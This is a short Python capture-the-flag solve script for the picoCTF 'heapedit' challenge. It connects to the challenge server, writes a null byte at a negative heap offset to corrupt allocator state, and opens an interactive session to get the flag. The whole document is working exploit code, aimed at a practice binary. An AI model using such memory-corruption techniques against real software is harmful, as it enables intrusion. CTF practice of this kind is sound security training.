from ptrlib import *

# sock = Process('./heapedit')
sock = Socket('mercury.picoctf.net', 34499)
# sock.sendlineafter(b'Address: ', b'-5144')
sock.sendlineafter(b'Address: ', b'-5144')
sock.sendlineafter(b'Value: ', b'\x00')

sock.interactive()
